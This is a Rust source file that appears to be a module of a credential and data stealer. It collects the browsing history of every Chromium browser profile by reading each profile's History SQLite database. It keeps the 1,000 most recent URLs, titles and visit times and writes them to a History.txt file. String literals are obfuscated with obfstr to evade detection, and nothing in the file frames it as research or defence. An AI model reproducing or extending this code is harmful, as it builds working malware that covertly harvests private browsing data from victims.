use crate::alloc::borrow::ToOwned;
use crate::chromium::Browser;
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, History};
use alloc::boxed::Box;
use alloc::sync::Arc;
use alloc::vec::Vec;
use obfstr::obfstr as s;
use sqlite::{TableRecord, TableRecordExtension};
use tasks::{parent_name, Task};
use utils::path::Path;

const URLS_URL: usize = 1;
const URLS_TITLE: usize = 2;
const URLS_LAST_VISIT_TIME: usize = 5;

pub(super) struct HistoryTask {
    browser: Arc<Browser>
}

impl HistoryTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for HistoryTask {
    parent_name!("History.txt");

    unsafe fn run(&self, parent: &Path) {
        let Some(mut history) = collect_from_all_profiles(&self.browser.profiles, read_history) else {
            return
        };
        
        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(1000);

        let _ = to_string_and_write_all(&history, "\n\n", parent);
    }
}

fn read_history(profile: &Path) -> Option<Vec<History>> {
    let history_path = profile / s!("History");
    read_sqlite3_and_map_records(&history_path, s!("Urls"), extract_history_from_record)
}

fn extract_history_from_record(record: &Box<dyn TableRecord>) -> Option<History> {
    let url = record.get_value(URLS_URL)?.as_string()?.to_owned();
    let title = record.get_value(URLS_TITLE)?.as_string()?.to_owned();
    let last_visit_time = record.get_value(URLS_LAST_VISIT_TIME)?.as_integer()?;
    
    Some(History {
        url,
        title,
        last_visit_time
    })
}